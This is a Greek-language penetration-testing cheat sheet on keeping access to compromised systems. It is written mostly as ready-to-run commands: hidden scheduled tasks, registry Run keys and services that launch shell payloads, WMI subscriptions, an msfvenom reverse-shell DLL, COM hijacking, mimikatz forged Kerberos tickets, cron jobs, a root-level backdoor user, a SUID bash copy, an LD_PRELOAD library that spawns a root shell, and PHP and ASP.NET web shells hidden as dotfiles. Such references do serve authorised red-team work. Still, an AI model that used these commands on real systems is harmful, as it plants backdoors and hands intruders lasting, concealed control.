# 🔒 Φάση 5: Διατήρηση πρόσβασης (Persistence)

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../05-Persistence.md) • [🇮🇹 Italiano](05-Persistence.it.md) • [🇹🇷 Türkçe](05-Persistence.tr.md)

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Στόχος:** Διατήρηση πρόσβασης στο σύστημα, ακόμη και μετά από επανεκκίνηση ή εντοπισμό της αρχικής πρόσβασης.

---

## Πριν ξεκινήσετε

Η **διατήρηση πρόσβασης (persistence)** αφορά μηχανισμούς που μπορούν να ενεργοποιούνται ξανά, για παράδειγμα όταν ξεκινά ο υπολογιστής ή συνδέεται ένας χρήστης. Μια αρχική συνεδρία μπορεί να χαθεί, ενώ μια σχετική αλλαγή σε εργασία, υπηρεσία ή κλειδί παραμένει.

**Βασικοί όροι:** Οι **Scheduled Tasks** των Windows και οι εργασίες **cron** του Linux εκτελούν ενέργειες βάσει χρόνου ή συμβάντος. Τα **Run Keys** και οι φάκελοι **Startup** σχετίζονται με αυτόματη εκτέλεση. Το **systemd** διαχειρίζεται υπηρεσίες σε πολλές διανομές Linux. Το `authorized_keys` περιέχει δημόσια κλειδιά που επιτρέπονται για σύνδεση SSH. Ένα **web shell** είναι κώδικας σε διακομιστή ιστού που επιτρέπει εκτέλεση εντολών μέσω της εφαρμογής.

Τα παραδείγματα αλλάζουν μόνιμες ρυθμίσεις ή δημιουργούν νέους τρόπους πρόσβασης. Σε μια δοκιμή απαιτείται καταγραφή κάθε αλλαγής και συμφωνημένη επαναφορά. Οι εγγραφές `AAAA...your_key...`, `{CLSID}` και `IEX(payload)` είναι ενδεικτικά στοιχεία και όχι ολοκληρωμένα δεδομένα.

## Περιεχόμενα

- [🖥️ Διατήρηση πρόσβασης στα Windows](#section-01)
- [🐧 Διατήρηση πρόσβασης στο Linux](#section-02)
- [🌐 Διατήρηση πρόσβασης μέσω εφαρμογών ιστού](#section-03)
- [📊 Γρήγορη αναφορά](#section-04)
- [🔗 Σχετικοί οδηγοί αναφοράς](#section-05)

<a id="section-01"></a>

## 🖥️ Διατήρηση πρόσβασης στα Windows

### Προγραμματισμένες εργασίες (Scheduled Tasks)
```cmd
# Δημιουργία προγραμματισμένης εργασίας με δικαιώματα SYSTEM
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# Με συγκεκριμένο λογαριασμό χρήστη
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# Κατά την εκκίνηση του συστήματος
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Κάθε ώρα
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# Εμφάνιση προγραμματισμένων εργασιών
schtasks /query /fo LIST /v

# Διαγραφή εργασίας
schtasks /delete /tn "TaskName" /f
```

### Κλειδιά αυτόματης εκτέλεσης στο μητρώο (Registry Run Keys)
```cmd
# HKCU — τρέχων χρήστης, συνήθως χωρίς δικαιώματα διαχειριστή
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM — όλοι οι χρήστες, απαιτούνται δικαιώματα διαχειριστή
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce — εκτέλεση μία φορά και έπειτα αφαίρεση της καταχώρισης
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Φάκελος αυτόματης εκκίνησης (Startup)
```cmd
# Τρέχων χρήστης
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# Όλοι οι χρήστες — απαιτούνται δικαιώματα διαχειριστή
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Υπηρεσίες
```cmd
# Δημιουργία υπηρεσίας — απαιτούνται δικαιώματα διαχειριστή
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Μεταβολή υπάρχουσας υπηρεσίας
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### Συνδρομές συμβάντων WMI (Event Subscriptions)

Ένας κανόνας παρακολουθεί κάποιο συμβάν και συνδέεται με μια ενέργεια που εκτελείται όταν αυτό συμβεί.

```powershell
# Παράδειγμα διατήρησης πρόσβασης μέσω συμβάντων WMI
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### Κατάχρηση βιβλιοθηκών DLL και της σειράς αναζήτησής τους
```cmd
# Έλεγχος πιθανής κατάχρησης της φόρτωσης DLL
# Τοποθέτηση της DLL του παραδείγματος στον κατάλογο της εφαρμογής
# Συνηθισμένα σημεία ελέγχου:
# - Εφαρμογές που δεν προσδιορίζουν πλήρεις διαδρομές για τις DLL
# - DLL που αναζητούνται αλλά δεν υπάρχουν

# Δημιουργία της DLL του παραδείγματος
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### Κατάχρηση αντικειμένων COM (COM Hijacking)
```powershell
# Εντοπισμός αντικειμένων COM
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Παράδειγμα αλλαγής της καταχώρισης COM
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Πλαστογραφημένα εισιτήρια Kerberos (Golden/Silver Ticket)
```powershell
# Golden Ticket — παράδειγμα διατήρησης προνομιακής πρόσβασης σε τομέα
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver Ticket — παράδειγμα πρόσβασης σε συγκεκριμένη υπηρεσία
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

<a id="section-02"></a>

## 🐧 Διατήρηση πρόσβασης στο Linux

### Προγραμματισμένες εργασίες (Cron Jobs)
```bash
# Αρχείο προγραμματισμένων εργασιών χρήστη
crontab -e
# Ενδεικτική καταχώριση: * * * * * /tmp/shell.sh

# Αρχείο προγραμματισμένων εργασιών συστήματος
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Κατάλογοι προγραμματισμένων εργασιών cron
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### Κλειδιά SSH
```bash
# Προσθήκη δημόσιου κλειδιού στο authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Πρόσβαση ως root
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Πρόσθετος λογαριασμός διατήρησης πρόσβασης (Backdoor User)
```bash
# Προσθήκη χρήστη με δικαιώματα root
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Παράδειγμα απευθείας προσθήκης στο /etc/passwd
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### Εκτελέσιμο με δικαίωμα SUID
```bash
# Αντιγραφή του bash και ενεργοποίηση δικαιώματος SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Εκτέλεση ως root
/tmp/.hidden -p
```

### Υπηρεσία systemd
```bash
# Δημιουργία αρχείου περιγραφής υπηρεσίας
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Ενεργοποίηση και εκκίνηση
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### Αρχεία ρυθμίσεων κελύφους bashrc / profile
```bash
# Προσθήκη στο bashrc του χρήστη
echo '/tmp/shell &' >> ~/.bashrc

# Προσθήκη στο κοινό αρχείο profile
echo '/tmp/shell &' >> /etc/profile

# Προσθήκη στο bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### Προφόρτωση κοινόχρηστων βιβλιοθηκών (LD_PRELOAD)

Μηχανισμός προφόρτωσης κοινόχρηστων βιβλιοθηκών πριν από άλλες βιβλιοθήκες ενός προγράμματος. Το παράδειγμα αφορά καθολική ρύθμιση και μπορεί να επηρεάσει τη λειτουργία εφαρμογών.

```bash
# Δημιουργία κοινόχρηστης βιβλιοθήκης του παραδείγματος
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Προσθήκη στη ρύθμιση προφόρτωσης βιβλιοθηκών
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Εκτέλεση εντολών μέσω εφαρμογής ιστού (Web Shell)
```bash
# Εκτέλεση εντολών μέσω αρχείου PHP
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# Εναλλακτική τοποθεσία του παραδείγματος
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

<a id="section-03"></a>

## 🌐 Διατήρηση πρόσβασης μέσω εφαρμογών ιστού

### Τοποθεσίες αρχείων Web Shell
```bash
# Συνηθισμένες τοποθεσίες αρχείων Web Shell
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### Web Shell σε ASP.NET
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

<a id="section-04"></a>

## 📊 Γρήγορη αναφορά

### Μέθοδοι διατήρησης πρόσβασης στα Windows

| Μέθοδος | Τοποθεσία | Απαιτούμενα δικαιώματα |
| -------- | ---------- | ----------- |
| Κλειδί Run στο μητρώο | HKCU/HKLM | Χρήστης/διαχειριστής, ανάλογα με τη ρύθμιση |
| Προγραμματισμένη εργασία | Χρονοπρογραμματιστής εργασιών | Χρήστης/διαχειριστής, ανάλογα με τη ρύθμιση |
| Φάκελος αυτόματης εκκίνησης (Startup) | AppData/ProgramData | Χρήστης/διαχειριστής, ανάλογα με τη ρύθμιση |
| Υπηρεσία | Υπηρεσίες | Διαχειριστής |
| WMI | Συνδρομή συμβάντων WMI | Διαχειριστής |
| Κατάχρηση COM | HKCU CLSID | Χρήστης |

### Μέθοδοι διατήρησης πρόσβασης στο Linux

| Μέθοδος | Τοποθεσία | Απαιτούμενα δικαιώματα |
| -------- | ---------- | ----------- |
| Cron | /etc/crontab | root |
| Κλειδιά SSH | ~/.ssh/authorized_keys | Χρήστης |
| SUID | Εκτελέσιμο με ενεργό το ειδικό δικαίωμα +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | Χρήστης |

---

<a id="section-05"></a>

## 🔗 Σχετικοί οδηγοί αναφοράς

- [PowerShell](../../PowerShell/translations/README.el.md)
- [Εντολές Linux](../../Linux-Commands/translations/README.el.md)
- [Metasploit](../../Metasploit/translations/README.el.md)

---

**Προηγούμενη φάση:** [← 04 — Πλευρική μετακίνηση](04-Lateral-Movement.el.md)

**Επόμενη φάση:** [06 — Αποφυγή μηχανισμών άμυνας →](06-Defense-Evasion.el.md)

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
